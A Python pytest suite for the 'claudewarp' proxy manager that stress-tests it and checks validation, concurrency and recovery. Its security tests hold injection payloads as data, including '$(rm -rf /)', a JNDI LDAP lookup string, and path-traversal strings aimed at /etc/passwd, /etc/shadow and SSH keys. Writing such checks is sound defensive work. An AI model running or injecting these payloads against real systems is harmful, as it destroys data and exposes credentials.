"""
边界条件和压力测试

测试各种极端情况和边界条件，确保系统健壮性。
"""

import tempfile
import threading
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from typing import List

import pytest

from claudewarp.core.config import ConfigManager
from claudewarp.core.manager import ProxyManager
from claudewarp.core.models import ProxyServer, ProxyConfig, ExportFormat
from claudewarp.core.exceptions import (
    ValidationError,
    DuplicateProxyError,
    ProxyNotFoundError,
    ConfigError
)


class TestBoundaryConditions:
    """测试边界条件"""

    @pytest.fixture
    def temp_manager(self):
        """临时管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "test_config.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    def test_maximum_proxy_count(self, temp_manager):
        """测试最大代理数量处理"""
        # 添加大量代理测试性能和稳定性
        max_proxies = 1000
        
        for i in range(max_proxies):
            proxy = ProxyServer(
                name=f"proxy-{i:04d}",
                base_url=f"https://api{i:04d}.example.com/",
                api_key=f"sk-{'1' * 10}{i:04d}",
                description=f"Proxy {i}",
                tags=[f"batch-{i//100}", "stress-test"]
            )
            
            result = temp_manager.add_proxy(proxy)
            assert result is True
            
            # 每100个代理验证一次状态
            if (i + 1) % 100 == 0:
                assert len(temp_manager.list_proxies()) == i + 1
        
        # 验证最终状态
        all_proxies = temp_manager.list_proxies()
        assert len(all_proxies) == max_proxies
        
        # 测试搜索性能
        start_time = time.time()
        search_results = temp_manager.search_proxies("proxy-0500")
        search_time = time.time() - start_time
        
        assert len(search_results) == 1
        assert search_time < 1.0  # 搜索应该在1秒内完成

    def test_extremely_long_values(self, temp_manager):
        """测试极长值处理"""
        # 测试极长的字符串值
        long_name = "a" * 1000
        long_description = "描述" * 1000
        long_tags = [f"tag-{i}" * 100 for i in range(50)]
        
        # 长名称应该被验证器拒绝（超过max_length=50）
        with pytest.raises(ValidationError):
            ProxyServer(
                name=long_name,
                base_url="https://api.example.com/",
                api_key="sk-1234567890abcdef"
            )
        
        # 长描述应该被验证器拒绝（超过max_length=200）
        with pytest.raises(ValidationError):
            ProxyServer(
                name="test-proxy",
                base_url="https://api.example.com/",
                api_key="sk-1234567890abcdef",
                description=long_description
            )
        
        # 大量标签应该被处理但可能被优化
        proxy = ProxyServer(
            name="test-long-tags",
            base_url="https://api.example.com/",
            api_key="sk-1234567890abcdef",
            tags=long_tags
        )
        
        temp_manager.add_proxy(proxy)
        retrieved_proxy = temp_manager.get_proxy("test-long-tags")
        
        # 验证标签被正确去重和处理
        assert len(retrieved_proxy.tags) <= len(long_tags)
        assert isinstance(retrieved_proxy.tags, list)

    def test_unicode_and_special_characters(self, temp_manager):
        """测试Unicode和特殊字符处理"""
        unicode_cases = [
            {
                "name": "proxy-emoji",
                "description": "代理服务器 🚀 with emoji",
                "tags": ["中文", "русский", "العربية", "🌍"]
            },
            {
                "name": "proxy-special",
                "description": "Special chars: !@#$%^&*()[]{}|;:,.<>?",
                "tags": ["special-chars", "symbols"]
            },
            {
                "name": "proxy-unicode",
                "description": "Unicode: αβγδε ñáéíóú çüöä",
                "tags": ["unicode", "international"]
            }
        ]
        
        for case in unicode_cases:
            proxy = ProxyServer(
                name=case["name"],
                base_url="https://api.example.com/",
                api_key="sk-1234567890abcdef",
                description=case["description"],
                tags=case["tags"]
            )
            
            temp_manager.add_proxy(proxy)
            retrieved_proxy = temp_manager.get_proxy(case["name"])
            
            assert retrieved_proxy.description == case["description"]
            assert set(retrieved_proxy.tags) == set(case["tags"])

    def test_concurrent_operations(self, temp_manager):
        """测试并发操作安全性"""
        def add_proxies(start_idx: int, count: int) -> List[str]:
            """并发添加代理"""
            added = []
            for i in range(start_idx, start_idx + count):
                try:
                    proxy = ProxyServer(
                        name=f"concurrent-proxy-{i:04d}",
                        base_url=f"https://api{i}.example.com/",
                        api_key=f"sk-{'1' * 10}{i:04d}",
                        description=f"Concurrent proxy {i}"
                    )
                    
                    result = temp_manager.add_proxy(proxy)
                    if result:
                        added.append(proxy.name)
                        
                except (DuplicateProxyError, ConfigError):
                    # 并发冲突是预期的
                    pass
                    
            return added
        
        # 使用多线程并发添加代理
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for i in range(0, 100, 20):
                future = executor.submit(add_proxies, i, 20)
                futures.append(future)
            
            # 收集结果
            all_added = []
            for future in futures:
                added = future.result()
                all_added.extend(added)
        
        # 验证结果
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) >= len(all_added) * 0.8  # 允许一定的冲突损失
        
        # 验证数据一致性
        for proxy_name in all_added:
            if proxy_name in final_proxies:
                proxy = temp_manager.get_proxy(proxy_name)
                assert proxy.name == proxy_name

    def test_memory_usage_stability(self, temp_manager):
        """测试内存使用稳定性"""
        import gc
        import sys
        
        # 获取初始内存引用计数
        initial_refs = sys.gettotalrefcount() if hasattr(sys, 'gettotalrefcount') else 0
        
        # 执行大量操作
        for cycle in range(10):
            # 添加代理
            for i in range(100):
                proxy = ProxyServer(
                    name=f"memory-test-{cycle}-{i:03d}",
                    base_url=f"https://api{i}.example.com/",
                    api_key=f"sk-{'1' * 10}{i:03d}"
                )
                temp_manager.add_proxy(proxy)
            
            # 删除一半代理
            all_proxies = list(temp_manager.list_proxies().keys())
            for i in range(0, len(all_proxies), 2):
                try:
                    temp_manager.remove_proxy(all_proxies[i])
                except ProxyNotFoundError:
                    pass
            
            # 强制垃圾回收
            gc.collect()
        
        # 验证最终状态
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) < 1000  # 不应该无限增长
        
        # 检查内存引用计数（如果可用）
        if hasattr(sys, 'gettotalrefcount'):
            final_refs = sys.gettotalrefcount()
            ref_growth = final_refs - initial_refs
            # 允许一定的内存增长，但不应该过度
            assert ref_growth < 10000

    def test_configuration_file_edge_cases(self, temp_manager):
        """测试配置文件边界情况"""
        # 测试空配置文件
        config_path = temp_manager.config_manager.config_path
        config_path.write_text("")
        
        with pytest.raises(ConfigError):
            temp_manager.config_manager.load_config()
        
        # 测试损坏的配置文件
        config_path.write_text("invalid toml content [[[")
        
        with pytest.raises(ConfigError):
            temp_manager.config_manager.load_config()
        
        # 测试只有部分内容的配置文件
        partial_config = """
version = "1.0"
current_proxy = "nonexistent"
"""
        config_path.write_text(partial_config)
        
        with pytest.raises(ConfigError):
            temp_manager.config_manager.load_config()

    def test_export_format_edge_cases(self, temp_manager):
        """测试导出格式边界情况"""
        # 添加测试代理
        proxy = ProxyServer(
            name="export-test",
            base_url="https://api.example.com/",
            api_key="sk-1234567890abcdef",
            description="Export test proxy"
        )
        temp_manager.add_proxy(proxy)
        
        # 测试极端导出格式配置
        extreme_format = ExportFormat(
            shell_type="bash",
            include_comments=True,
            prefix="EXTREMELY_LONG_PREFIX_THAT_MIGHT_CAUSE_ISSUES_",
            export_all=True
        )
        
        # 应该能正常导出
        export_content = temp_manager.export_environment(extreme_format)
        assert isinstance(export_content, str)
        assert len(export_content) > 0
        assert "EXTREMELY_LONG_PREFIX_THAT_MIGHT_CAUSE_ISSUES_" in export_content

    def test_rapid_configuration_changes(self, temp_manager):
        """测试快速配置变更"""
        # 快速添加和删除代理
        for iteration in range(50):
            # 添加代理
            proxy = ProxyServer(
                name=f"rapid-{iteration:03d}",
                base_url=f"https://api{iteration}.example.com/",
                api_key=f"sk-{'1' * 10}{iteration:03d}"
            )
            temp_manager.add_proxy(proxy)
            
            # 立即切换到该代理
            temp_manager.switch_proxy(f"rapid-{iteration:03d}")
            
            # 验证当前代理
            current = temp_manager.get_current_proxy()
            assert current.name == f"rapid-{iteration:03d}"
            
            # 每10次清理一下
            if iteration % 10 == 9:
                # 删除前面的代理
                for i in range(max(0, iteration - 9), iteration):
                    try:
                        temp_manager.remove_proxy(f"rapid-{i:03d}")
                    except ProxyNotFoundError:
                        pass
        
        # 验证最终状态一致
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) <= 10


class TestErrorRecoveryScenarios:
    """测试错误恢复场景"""

    @pytest.fixture
    def temp_manager(self):
        """临时管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "test_config.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    def test_configuration_corruption_recovery(self, temp_manager):
        """测试配置损坏后的恢复"""
        # 先添加一些正常数据
        proxy = ProxyServer(
            name="recovery-test",
            base_url="https://api.example.com/",
            api_key="sk-1234567890abcdef"
        )
        temp_manager.add_proxy(proxy)
        
        # 人为损坏配置文件
        config_path = temp_manager.config_manager.config_path
        config_path.write_text("corrupted data [[[")
        
        # 尝试加载应该失败
        with pytest.raises(ConfigError):
            temp_manager.config_manager.load_config()
        
        # 检查是否有备份文件
        backup_files = temp_manager.config_manager.get_backup_files()
        if backup_files:
            # 从备份恢复
            latest_backup = backup_files[0]
            result = temp_manager.config_manager.restore_from_backup(latest_backup)
            assert result is True
            
            # 验证恢复后的数据
            recovered_config = temp_manager.config_manager.load_config()
            assert "recovery-test" in recovered_config.proxies

    def test_partial_operation_failure_recovery(self, temp_manager):
        """测试部分操作失败后的恢复"""
        # 添加一些代理
        for i in range(5):
            proxy = ProxyServer(
                name=f"test-proxy-{i}",
                base_url=f"https://api{i}.example.com/",
                api_key=f"sk-{'1' * 10}{i}"
            )
            temp_manager.add_proxy(proxy)
        
        initial_count = len(temp_manager.list_proxies())
        
        # 模拟批量操作中的部分失败
        operations_attempted = 0
        operations_succeeded = 0
        
        for i in range(10):
            try:
                operations_attempted += 1
                
                if i % 3 == 0:
                    # 尝试添加重复代理（应该失败）
                    duplicate_proxy = ProxyServer(
                        name="test-proxy-0",  # 重复名称
                        base_url="https://different.example.com/",
                        api_key="sk-different-key"
                    )
                    temp_manager.add_proxy(duplicate_proxy)
                else:
                    # 添加新代理（应该成功）
                    new_proxy = ProxyServer(
                        name=f"batch-proxy-{i}",
                        base_url=f"https://batch{i}.example.com/",
                        api_key=f"sk-batch-{i:10d}"
                    )
                    temp_manager.add_proxy(new_proxy)
                    operations_succeeded += 1
                    
            except DuplicateProxyError:
                # 预期的失败
                pass
        
        # 验证系统状态保持一致
        final_proxies = temp_manager.list_proxies()
        expected_count = initial_count + operations_succeeded
        assert len(final_proxies) == expected_count
        
        # 验证所有代理都是有效的
        for proxy_name, proxy in final_proxies.items():
            assert proxy.name == proxy_name
            assert len(proxy.api_key) >= 3  # 基本验证

    def test_resource_exhaustion_handling(self, temp_manager):
        """测试资源耗尽处理"""
        from unittest.mock import patch
        
        # 模拟磁盘空间不足
        with patch('claudewarp.core.utils.check_disk_space') as mock_check:
            from claudewarp.core.exceptions import DiskSpaceError
            mock_check.side_effect = DiskSpaceError("/tmp", 1000)
            
            proxy = ProxyServer(
                name="resource-test",
                base_url="https://api.example.com/",
                api_key="sk-1234567890abcdef"
            )
            
            # 添加代理应该失败但不崩溃
            with pytest.raises((DiskSpaceError, ConfigError)):
                temp_manager.add_proxy(proxy)
            
            # 系统应该保持稳定状态
            existing_proxies = temp_manager.list_proxies()
            assert isinstance(existing_proxies, dict)


class TestPerformanceBenchmarks:
    """性能基准测试"""

    @pytest.fixture
    def benchmark_manager(self):
        """基准测试管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "benchmark_config.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    @pytest.mark.slow
    def test_large_proxy_list_performance(self, benchmark_manager):
        """测试大代理列表性能"""
        # 添加大量代理
        proxy_count = 5000
        
        start_time = time.time()
        for i in range(proxy_count):
            proxy = ProxyServer(
                name=f"perf-proxy-{i:05d}",
                base_url=f"https://api{i:05d}.example.com/",
                api_key=f"sk-{'1' * 10}{i:05d}",
                description=f"Performance test proxy {i}",
                tags=[f"batch-{i//1000}", "perf-test"]
            )
            benchmark_manager.add_proxy(proxy)
        
        add_time = time.time() - start_time
        
        # 测试各种操作的性能
        performance_metrics = {}
        
        # 列出所有代理
        start_time = time.time()
        all_proxies = benchmark_manager.list_proxies()
        performance_metrics['list_all'] = time.time() - start_time
        
        assert len(all_proxies) == proxy_count
        
        # 搜索操作
        start_time = time.time()
        search_results = benchmark_manager.search_proxies("perf-proxy-02500")
        performance_metrics['search_single'] = time.time() - start_time
        
        assert len(search_results) == 1
        
        # 按标签搜索
        start_time = time.time()
        tag_results = benchmark_manager.search_proxies("batch-2", fields=["tags"])
        performance_metrics['search_by_tag'] = time.time() - start_time
        
        assert len(tag_results) == 1000  # batch-2 应该有1000个代理
        
        # 导出环境变量
        benchmark_manager.switch_proxy("perf-proxy-02500")
        start_time = time.time()
        export_content = benchmark_manager.export_environment()
        performance_metrics['export_env'] = time.time() - start_time
        
        assert len(export_content) > 0
        
        # 性能断言
        assert performance_metrics['list_all'] < 1.0  # 列出5000个代理应该在1秒内
        assert performance_metrics['search_single'] < 0.1  # 单个搜索应该在0.1秒内
        assert performance_metrics['search_by_tag'] < 0.5  # 标签搜索应该在0.5秒内
        assert performance_metrics['export_env'] < 0.1  # 导出应该在0.1秒内
        
        print(f"\n性能基准测试结果 (处理{proxy_count}个代理):")
        print(f"添加所有代理: {add_time:.2f}s")
        for operation, duration in performance_metrics.items():
            print(f"{operation}: {duration:.4f}s")

    def test_configuration_io_performance(self, benchmark_manager):
        """测试配置文件I/O性能"""
        # 创建中等规模的配置
        for i in range(100):
            proxy = ProxyServer(
                name=f"io-test-{i:03d}",
                base_url=f"https://api{i:03d}.example.com/",
                api_key=f"sk-{'1' * 10}{i:03d}",
                description=f"IO test proxy {i}" * 10,  # 较长的描述
                tags=[f"tag-{j}" for j in range(5)]  # 多个标签
            )
            benchmark_manager.add_proxy(proxy)
        
        config_manager = benchmark_manager.config_manager
        config = benchmark_manager.config
        
        # 测试保存性能
        save_times = []
        for _ in range(10):
            start_time = time.time()
            config_manager.save_config(config)
            save_times.append(time.time() - start_time)
        
        # 测试加载性能
        load_times = []
        for _ in range(10):
            start_time = time.time()
            config_manager.load_config()
            load_times.append(time.time() - start_time)
        
        avg_save_time = sum(save_times) / len(save_times)
        avg_load_time = sum(load_times) / len(load_times)
        
        # 性能断言
        assert avg_save_time < 0.5  # 平均保存时间应该在0.5秒内
        assert avg_load_time < 0.5  # 平均加载时间应该在0.5秒内
        
        print(f"\n配置I/O性能 (100个代理):")
        print(f"平均保存时间: {avg_save_time:.4f}s")
        print(f"平均加载时间: {avg_load_time:.4f}s")


class TestSecurityBoundaryConditions:
    """测试安全相关边界条件"""

    @pytest.fixture
    def temp_manager(self):
        """临时管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "security_test.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    def test_injection_attack_resistance(self, temp_manager):
        """测试注入攻击抵抗性"""
        injection_payloads = [
            "'; DROP TABLE proxies; --",
            "${jndi:ldap://malicious.com/evil}",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "{{7*7}}",  # Template injection
            "${ENV_VAR}",  # Environment variable injection
        ]

        for payload in injection_payloads:
            try:
                # 尝试在各个字段中注入恶意内容
                proxy = ProxyServer(
                    name=f"test-{abs(hash(payload)) % 10000}",  # 合法化名称
                    base_url="https://api.example.com/",
                    api_key="sk-1234567890abcdef",
                    description=payload,  # 注入到描述中
                    tags=[payload[:20] if len(payload) > 20 else payload]  # 注入到标签中
                )
                
                temp_manager.add_proxy(proxy)
                
                # 验证数据被安全存储但不执行
                retrieved = temp_manager.get_proxy(proxy.name)
                assert retrieved.description == payload  # 原样存储
                assert payload[:20] in retrieved.tags or payload in retrieved.tags
                
                # 序列化测试
                data = retrieved.dict()
                assert isinstance(data, dict)
                
            except ValidationError:
                # 某些注入可能被验证器拒绝，这是好的
                pass

    def test_malformed_url_handling(self, temp_manager):
        """测试恶意格式URL处理"""
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://malicious.com/",
            "ldap://malicious.com/",
            "gopher://malicious.com:70/",
            "https://../../etc/passwd",
            "https://localhost:22/",  # SSH端口
            "https://0.0.0.0/",  # 可能的本地地址
        ]

        for malicious_url in malicious_urls:
            with pytest.raises(ValidationError):
                ProxyServer(
                    name=f"malicious-{abs(hash(malicious_url)) % 1000}",
                    base_url=malicious_url,
                    api_key="sk-1234567890abcdef"
                )

    def test_api_key_format_security(self, temp_manager):
        """测试API密钥格式安全性"""
        suspicious_keys = [
            "../../../etc/passwd",
            "$(cat /etc/passwd)",
            "`whoami`",
            "${HOME}/.ssh/id_rsa",
            "'; rm -rf /; echo 'sk-",
            "\x00\x01\x02\x03",  # 空字节和控制字符
            "sk-" + "A" * 10000,  # 极长密钥
        ]

        for suspicious_key in suspicious_keys:
            try:
                proxy = ProxyServer(
                    name=f"suspicious-{abs(hash(suspicious_key)) % 1000}",
                    base_url="https://api.example.com/",
                    api_key=suspicious_key
                )
                
                temp_manager.add_proxy(proxy)
                
                # 验证密钥被安全存储
                retrieved = temp_manager.get_proxy(proxy.name)
                assert retrieved.api_key == suspicious_key
                
            except ValidationError:
                # 某些格式可能被拒绝，这是预期的
                pass

    def test_configuration_tampering_detection(self, temp_manager):
        """测试配置文件篡改检测"""
        # 添加合法代理
        proxy = ProxyServer(
            name="legitimate-proxy",
            base_url="https://api.example.com/",
            api_key="sk-1234567890abcdef"
        )
        temp_manager.add_proxy(proxy)

        config_path = temp_manager.config_manager.config_path
        
        # 篡改配置文件
        with open(config_path, 'a', encoding='utf-8') as f:
            f.write('\n[malicious_section]\nmalicious_key = "malicious_value"\n')

        # 重新加载应该检测到问题或安全处理
        try:
            loaded_config = temp_manager.config_manager.load_config()
            # 如果成功加载，恶意内容应该被忽略
            config_dict = loaded_config.dict()
            assert "malicious_section" not in str(config_dict)
        except ConfigError:
            # 或者抛出配置错误，这也是可接受的
            pass

    def test_unicode_security_issues(self, temp_manager):
        """测试Unicode安全问题"""
        # Unicode规范化攻击
        unicode_attacks = [
            "ﬀ",  # Unicode ligature
            "𝒶𝒹𝓂𝒾𝓃",  # Mathematical script
            "аdmin",  # Cyrillic 'a' 
            "admin\u200b",  # Zero-width space
            "admin\u202e",  # Right-to-left override
            "admin\ufeff",  # Zero-width no-break space
        ]

        for attack_string in unicode_attacks:
            try:
                proxy = ProxyServer(
                    name=f"unicode-{abs(hash(attack_string)) % 1000}",
                    base_url="https://api.example.com/",
                    api_key="sk-1234567890abcdef",
                    description=attack_string,
                    tags=[attack_string]
                )
                
                temp_manager.add_proxy(proxy)
                
                # 验证数据完整性
                retrieved = temp_manager.get_proxy(proxy.name)
                assert retrieved.description == attack_string
                
            except ValidationError:
                # 某些Unicode攻击可能被拒绝
                pass

    def test_path_traversal_protection(self, temp_manager):
        """测试路径遍历攻击防护"""
        from unittest.mock import patch
        
        # 尝试使用路径遍历的配置路径
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]

        for malicious_path in malicious_paths:
            try:
                with tempfile.TemporaryDirectory() as temp_dir:
                    # 构造相对路径攻击
                    base_path = Path(temp_dir)
                    config_path = base_path / malicious_path
                    
                    manager = ProxyManager(config_path=config_path)
                    
                    # 验证路径被限制在安全范围内
                    actual_path = manager.config_manager.config_path
                    
                    # 路径应该被规范化或限制
                    assert isinstance(actual_path, Path)
                    
            except (PermissionError, OSError, ValueError):
                # 路径遍历应该被阻止
                pass


class TestAdvancedErrorRecovery:
    """测试高级错误恢复场景"""

    @pytest.fixture
    def temp_manager(self):
        """临时管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "recovery_test.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    def test_cascading_failure_recovery(self, temp_manager):
        """测试级联故障恢复"""
        # 添加一系列相互依赖的配置
        proxies = []
        for i in range(10):
            proxy = ProxyServer(
                name=f"cascade-{i}",
                base_url=f"https://api{i}.example.com/",
                api_key=f"sk-cascade-{i:010d}",
                description=f"Cascade proxy {i}"
            )
            proxies.append(proxy)
            temp_manager.add_proxy(proxy)

        # 设置当前代理
        temp_manager.switch_proxy("cascade-5")
        assert temp_manager.get_current_proxy().name == "cascade-5"

        # 模拟级联删除（删除包括当前代理在内的多个代理）
        failed_deletions = []
        successful_deletions = []
        
        for i in [5, 3, 7, 1, 9]:  # 包含当前代理
            try:
                temp_manager.remove_proxy(f"cascade-{i}")
                successful_deletions.append(i)
            except ProxyNotFoundError:
                failed_deletions.append(i)

        # 验证系统恢复到一致状态
        remaining_proxies = temp_manager.list_proxies()
        current_proxy = temp_manager.get_current_proxy()
        
        # 当前代理应该被自动切换或清空
        if current_proxy:
            assert current_proxy.name in remaining_proxies
        
        # 所有剩余代理应该有效
        for proxy_name, proxy in remaining_proxies.items():
            assert proxy.name == proxy_name

    def test_backup_corruption_recovery(self, temp_manager):
        """测试备份损坏恢复"""
        # 创建一些数据
        for i in range(5):
            proxy = ProxyServer(
                name=f"backup-test-{i}",
                base_url=f"https://api{i}.example.com/",
                api_key=f"sk-backup-{i:010d}"
            )
            temp_manager.add_proxy(proxy)

        # 获取备份文件
        backup_files = temp_manager.config_manager.get_backup_files()
        
        if backup_files:
            # 损坏所有备份文件
            for backup_file in backup_files:
                backup_file.write_text("corrupted backup data")

            # 同时损坏主配置文件
            config_path = temp_manager.config_manager.config_path
            config_path.write_text("corrupted main config")

            # 尝试恢复应该失败但不崩溃
            with pytest.raises(ConfigError):
                temp_manager.config_manager.load_config()

            # 系统应该能够创建新的默认配置
            new_manager = ProxyManager(config_path=config_path)
            default_config = new_manager.config
            
            assert isinstance(default_config, ProxyConfig)
            assert len(default_config.proxies) == 0  # 新的空配置

    def test_concurrent_failure_isolation(self, temp_manager):
        """测试并发故障隔离"""
        def faulty_worker(worker_id):
            """故障工作线程"""
            results = []
            
            for operation in range(10):
                try:
                    if operation % 3 == 0:
                        # 添加无效代理（应该失败）
                        invalid_proxy = ProxyServer(
                            name="",  # 无效名称
                            base_url="invalid://url",
                            api_key="short"
                        )
                        temp_manager.add_proxy(invalid_proxy)
                        results.append("invalid_add_unexpected_success")
                        
                    elif operation % 3 == 1:
                        # 删除不存在的代理（应该失败）
                        temp_manager.remove_proxy(f"nonexistent-{worker_id}-{operation}")
                        results.append("nonexistent_delete_unexpected_success")
                        
                    else:
                        # 添加有效代理（应该成功）
                        valid_proxy = ProxyServer(
                            name=f"worker-{worker_id}-valid-{operation}",
                            base_url=f"https://api{worker_id}{operation}.example.com/",
                            api_key=f"sk-{worker_id:02d}{operation:02d}{'1'*10}"
                        )
                        temp_manager.add_proxy(valid_proxy)
                        results.append("valid_add_success")
                        
                except (ValidationError, ProxyNotFoundError, DuplicateProxyError):
                    # 预期的失败
                    results.append("expected_failure")
                except Exception as e:
                    # 意外的异常
                    results.append(f"unexpected_error_{type(e).__name__}")
            
            return results

        # 启动多个故障工作线程
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [
                executor.submit(faulty_worker, worker_id)
                for worker_id in range(5)
            ]
            
            all_results = []
            for future in futures:
                worker_results = future.result()
                all_results.extend(worker_results)

        # 分析结果
        expected_failures = len([r for r in all_results if r == "expected_failure"])
        valid_successes = len([r for r in all_results if r == "valid_add_success"])
        unexpected_errors = len([r for r in all_results if r.startswith("unexpected_error")])
        
        # 验证故障隔离
        assert expected_failures > 0  # 应该有预期的失败
        assert valid_successes > 0  # 应该有成功的操作
        assert unexpected_errors == 0  # 不应该有意外错误
        
        # 验证系统最终状态
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) == valid_successes

    def test_memory_pressure_recovery(self, temp_manager):
        """测试内存压力下的恢复"""
        import gc
        
        # 模拟内存压力
        memory_hogs = []
        
        try:
            # 创建一些内存压力
            for _ in range(100):
                memory_hogs.append(['x'] * 10000)
            
            # 在内存压力下执行操作
            operations_completed = 0
            for i in range(1000):
                try:
                    proxy = ProxyServer(
                        name=f"memory-pressure-{i:04d}",
                        base_url=f"https://api{i}.example.com/",
                        api_key=f"sk-{'1'*10}{i:04d}",
                        description="Memory pressure test " * 100  # 较大的描述
                    )
                    
                    temp_manager.add_proxy(proxy)
                    operations_completed += 1
                    
                    # 每100个操作清理一下
                    if i % 100 == 99:
                        gc.collect()
                        
                except (MemoryError, OSError):
                    # 内存不足时停止
                    break
                    
        finally:
            # 清理内存压力
            memory_hogs.clear()
            gc.collect()

        # 验证系统仍然可用
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) == operations_completed
        
        # 验证能够继续正常操作
        recovery_proxy = ProxyServer(
            name="recovery-test",
            base_url="https://recovery.example.com/",
            api_key="sk-recovery-test"
        )
        temp_manager.add_proxy(recovery_proxy)
        
        assert "recovery-test" in temp_manager.list_proxies()


class TestEdgeCaseIntegration:
    """测试边缘情况集成"""

    @pytest.fixture
    def temp_manager(self):
        """临时管理器fixture"""
        with tempfile.TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "edge_case_test.toml"
            manager = ProxyManager(config_path=config_path)
            yield manager

    def test_extreme_configuration_combinations(self, temp_manager):
        """测试极端配置组合"""
        # 创建各种极端配置的代理
        extreme_configs = [
            {
                "name": "minimal",
                "base_url": "https://a.co/",
                "api_key": "abc",
                "description": "",
                "tags": []
            },
            {
                "name": "maximal-" + "x" * 40,  # 接近最大长度
                "base_url": "https://" + "very-long-subdomain." * 10 + "example.com/",
                "api_key": "sk-" + "a" * 100,
                "description": "测试描述 " * 25,  # 接近最大长度
                "tags": [f"tag-{i}" for i in range(50)]  # 大量标签
            },
            {
                "name": "unicode-mixed",
                "base_url": "https://тест.example.com/",
                "api_key": "sk-тест-key-测试",
                "description": "Mixed unicode: αβγ тест 测试 🌍",
                "tags": ["中文", "русский", "ελληνικά", "🏷️"]
            }
        ]

        for config in extreme_configs:
            proxy = ProxyServer(**config)
            temp_manager.add_proxy(proxy)

        # 验证所有代理都正确存储
        all_proxies = temp_manager.list_proxies()
        assert len(all_proxies) == len(extreme_configs)

        # 测试搜索在极端配置下的工作
        search_results = temp_manager.search_proxies("测试")
        assert len(search_results) >= 1

        # 测试导出在极端配置下的工作
        temp_manager.switch_proxy("unicode-mixed")
        export_content = temp_manager.export_environment()
        assert len(export_content) > 0

    def test_rapid_state_transitions(self, temp_manager):
        """测试快速状态转换"""
        # 快速创建和切换状态
        proxy_names = []
        
        for i in range(20):
            proxy = ProxyServer(
                name=f"transition-{i:02d}",
                base_url=f"https://api{i}.example.com/",
                api_key=f"sk-transition-{i:010d}"
            )
            temp_manager.add_proxy(proxy)
            proxy_names.append(proxy.name)
            
            # 立即切换到新代理
            temp_manager.switch_proxy(proxy.name)
            
            # 验证切换成功
            current = temp_manager.get_current_proxy()
            assert current.name == proxy.name
            
            # 每5个代理做一次复杂操作
            if i % 5 == 4:
                # 搜索操作
                search_results = temp_manager.search_proxies("transition")
                assert len(search_results) == i + 1
                
                # 更新操作
                temp_manager.update_proxy(
                    proxy.name,
                    description=f"Updated at iteration {i}"
                )
                
                # 导出操作
                export_content = temp_manager.export_environment()
                assert proxy.name.replace('-', '_').upper() in export_content or proxy.base_url in export_content

        # 快速删除操作
        for i in range(0, 20, 2):  # 删除偶数编号的代理
            temp_manager.remove_proxy(f"transition-{i:02d}")

        # 验证最终状态一致性
        remaining_proxies = temp_manager.list_proxies()
        assert len(remaining_proxies) == 10

        current_proxy = temp_manager.get_current_proxy()
        if current_proxy:
            assert current_proxy.name in remaining_proxies

    def test_error_boundary_combinations(self, temp_manager):
        """测试错误边界组合"""
        # 创建一些正常代理作为基础
        for i in range(5):
            proxy = ProxyServer(
                name=f"base-{i}",
                base_url=f"https://base{i}.example.com/",
                api_key=f"sk-base-{i:010d}"
            )
            temp_manager.add_proxy(proxy)

        # 尝试各种错误组合
        error_scenarios = [
            # 重复名称
            lambda: temp_manager.add_proxy(ProxyServer(
                name="base-0",  # 重复
                base_url="https://different.example.com/",
                api_key="sk-different-key"
            )),
            
            # 切换到不存在的代理
            lambda: temp_manager.switch_proxy("nonexistent-proxy"),
            
            # 删除不存在的代理
            lambda: temp_manager.remove_proxy("nonexistent-proxy"),
            
            # 更新不存在的代理
            lambda: temp_manager.update_proxy("nonexistent-proxy", description="new desc"),
            
            # 搜索空字符串
            lambda: temp_manager.search_proxies(""),
            
            # 导出没有当前代理的配置
            lambda: (
                temp_manager.config.__setattr__('current_proxy', None),
                temp_manager.export_environment()
            )[-1],
        ]

        # 执行错误场景并验证系统稳定性
        error_count = 0
        for scenario in error_scenarios:
            try:
                scenario()
            except (DuplicateProxyError, ProxyNotFoundError, ConfigError, ValidationError):
                error_count += 1
            except Exception as e:
                # 意外异常应该记录但不影响测试
                print(f"Unexpected error in scenario: {e}")

        # 验证系统仍然可用
        assert error_count > 0  # 应该有一些预期的错误
        
        final_proxies = temp_manager.list_proxies()
        assert len(final_proxies) == 5  # 基础代理应该仍然存在
        
        # 验证能够继续正常操作
        new_proxy = ProxyServer(
            name="recovery-after-errors",
            base_url="https://recovery.example.com/",
            api_key="sk-recovery-test"
        )
        temp_manager.add_proxy(new_proxy)
        assert len(temp_manager.list_proxies()) == 6